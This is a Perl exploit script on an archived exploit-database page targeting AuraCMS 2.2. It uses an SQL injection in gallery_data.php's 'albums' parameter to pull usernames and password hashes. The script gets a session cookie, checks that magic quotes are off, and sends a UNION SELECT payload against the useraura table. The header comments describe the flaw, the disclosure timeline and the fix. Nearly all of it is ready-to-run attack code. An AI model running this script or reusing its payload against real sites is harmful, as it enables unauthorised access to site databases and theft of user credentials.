<html><head><title>AuraCMS 2.2 (gallery_data.php) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Cookies;
use Getopt::Long;

#
# [!] Discovered.: DNX
# [!] Vendor.....: http://www.auracms.org
# [!] Detected...: 19.01.2008
# [!] Reported...: 25.01.2008
# [!] Response...: 30.01.2008
#
# [!] Background.: AuraCMS is a CMS based on PHP and SQL
#
# [!] Bug........: $_GET['albums'] in mod/gallery/ajax/gallery_data.php near line 173
#
#                  173:  case 'detail':
#                  174:    if (isset($_GET['id'])){
#                  175:      $id = $_GET['id'];
#                  176:      $albums = $_GET['albums'];
#
#                  200:      $query = mysql_query (&quot;SELECT * FROM `mod_gallery`  WHERE `kid` = '$albums' $SQL_SORT LIMIT $image,$limitimage&quot;);
#
# [!] Solution...: Install gallery update!
#

if(!$ARGV[1])
{
  print &quot;\n                             \\#'#/                        &quot;;
  print &quot;\n                             (-.-)                         &quot;;
  print &quot;\n   ---------------------oOO---(_)---OOo--------------------&quot;;
  print &quot;\n   | AuraCMS v2.2 (gallery_data.php) Remote SQL Injection |&quot;;
  print &quot;\n   |         (works only with magic quotes = off)         |&quot;;
  print &quot;\n   |                     coded by DNX                     |&quot;;
  print &quot;\n   --------------------------------------------------------&quot;;
  print &quot;\n[!] Usage......: perl aura.pl [Host] [Path] &lt;Options&gt;&quot;;
  print &quot;\n[!] Example....: perl aura.pl 127.0.0.1 /auracms/&quot;;
  print &quot;\n[!] Options....:&quot;;
  print &quot;\n       -p [ip:port]  Proxy support&quot;;
  print &quot;\n&quot;;
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my %options = ();
GetOptions(\%options, &quot;p=s&quot;);

print &quot;[!] Exploiting...\n&quot;;

exploit();

print &quot;\n[!] Exploit done\n&quot;;

sub exploit
{
  my $url1 = &quot;http://&quot;.$host.$path.&quot;index.php?pilih=gallery&amp;mod=yes&quot;;
  my $url2 = &quot;http://&quot;.$host.$path.&quot;mod/gallery/ajax/gallery_data.php&quot;;
  my $ua = LWP::UserAgent-&gt;new;
  my $cookie = HTTP::Cookies-&gt;new();
  my $regexp = &quot;:\&quot;(.*?)\&quot;,\&quot;name\&quot;(.*)([a-fA-F0-9]{32})&quot;;
  my $res = &quot;&quot;;
  
  if($options{&quot;p&quot;})
  {
    $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
  }
  
  ###############
  # exist file? #
  ###############
  $res = $ua-&gt;get($url2);
  if(!$res-&gt;is_success)
  {
    die(&quot;[!] Failed, file not found\n&quot;);
  }
  
  ##########################
  # get cookie from server #
  ##########################
  $res = $ua-&gt;get($url1);
  $cookie-&gt;extract_cookies($res);
  $ua-&gt;cookie_jar($cookie);
  $ua-&gt;get($url2);
  $res = $ua-&gt;get($url2);
  
  ######################
  # check magic quotes #
  ######################
  $url2 .= &quot;?action=detail&amp;id=&amp;image=&amp;albums='&quot;;
  $res = $ua-&gt;get($url2);
  $content = $res-&gt;content;
  
  if($content =~ /,\&quot;albums\&quot;:\[\&quot;\\\\'\&quot;],/)
  {
    die(&quot;[!] Failed, magic quotes on\n&quot;)
  }
  
  ##############
  # get hashes #
  ##############
  $url2 .= &quot;%20union%20select%20user,2,3,4,5,6,7,password,9,10%20from%20useraura/*&quot;;
  $res = $ua-&gt;get($url2);
  $content = $res-&gt;content;
  
  my @cont = split(/{\&quot;files\&quot;/, $content);
  foreach (@cont)
  {
    if($_ =~ /$regexp/)
    {
      print &quot;$1 $3\n&quot;;
    }
  }
}

# milw0rm.com [2008-02-12]</pre></html>